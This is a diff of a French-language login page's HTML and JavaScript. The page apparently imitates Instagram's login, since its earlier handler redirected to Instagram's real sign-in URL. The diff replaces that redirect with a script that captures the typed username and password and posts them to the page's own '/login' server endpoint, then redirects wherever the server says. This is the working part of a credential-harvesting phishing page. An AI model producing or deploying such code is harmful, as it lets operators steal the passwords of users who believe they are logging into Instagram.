@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8" />
@@ -301,9 +301,56 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // Gestion du formulaire de connexion
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            window.location.href = 'https://www.instagram.com/accounts/login/';
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const loading = document.getElementById('loading');
+            const error = document.getElementById('error');
+            
+            error.textContent = '';
+            
+            if (!username || !password) {
+                error.textContent = 'Veuillez remplir tous les champs';
+                return;
+            }
+            
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Connexion...';
+            loading.style.display = 'block';
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    if (data.redirect) {
+                        window.location.href = data.redirect;
+                    } else {
+                        alert('Connexion réussie !');
+                    }
+                } else {
+                    throw new Error(data.message || 'Erreur de connexion');
+                }
+                
+            } catch (err) {
+                console.error('Erreur:', err);
+                error.textContent = 'Nom d\'utilisateur ou mot de passe incorrect';
+                
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Se connecter';
+                loading.style.display = 'none';
+            }
         });
 
         document.querySelectorAll('.input-field').forEach(input => {
